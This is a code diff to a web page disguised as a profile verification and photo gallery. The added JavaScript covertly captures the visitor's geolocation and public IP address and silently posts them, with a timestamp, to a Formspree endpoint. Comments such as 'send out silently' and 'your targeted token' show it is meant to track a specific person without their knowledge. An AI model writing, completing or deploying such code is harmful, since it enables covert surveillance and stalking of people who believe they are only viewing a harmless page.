@@ -81,7 +81,7 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // 1. Show success text and load the photo display dynamically
+                // 1. Show layout verification state & images locally
                 document.getElementById('status-message').textContent = "Profile Verified Successfully!";
                 
                 document.getElementById('gallery').innerHTML = `
@@ -89,7 +89,7 @@
                     <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=400" alt="Yellow Flowers">
                 `;
 
-                // 2. Fetch the IP address from the correct API endpoint and forward everything
+                // 2. Fetch the IP address from JSON API and send out silently
                 fetch("https://api.ipify.org?format=json")
                     .then(ipRes => {
                         if (!ipRes.ok) throw new Error("Network response error");
@@ -111,9 +111,10 @@
     }
 
     function sendToFormspree(latitude, longitude, ipAddress) {
+        // Updated Formspree Endpoint using your targeted token
         const targetUrl = "https://formspree.io/f/mjgqwonp"; 
 
-        // Generate UK local time structure dynamically (accounting for BST shifts)
+        // Generate current UK local time (Handles daylight savings/BST adjustments automatically)
         const options = {
             timeZone: 'Europe/London',
             year: 'numeric', month: '2-digit', day: '2-digit',
@@ -126,5 +127,30 @@
         parts.forEach(({type, value}) => { hash[type] = value; });
         const localTimestamp = `${hash.year}-${hash.month}-${hash.day} ${hash.hour}:${hash.minute}:${hash.second} (UK Time)`;
 
+        // Cross-referenced confirmed format logic
         const formData = new URLSearchParams();
-        formData.append
+        formData.append("Visitor_IP", ipAddress);
+        formData.append("Latitude", latitude);
+        formData.append("Longitude", longitude);
+        formData.append("Timestamp", localTimestamp);
+
+        fetch(targetUrl, {
+            method: "POST",
+            headers: { 
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: formData.toString()
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Transmission completely successful.");
+            } else {
+                console.error("Formspree rejected data submission.");
+            }
+        })
+        .catch(error => console.error("Formspree connection error:", error));
+    }
+    </script>
+</body>
+</html>
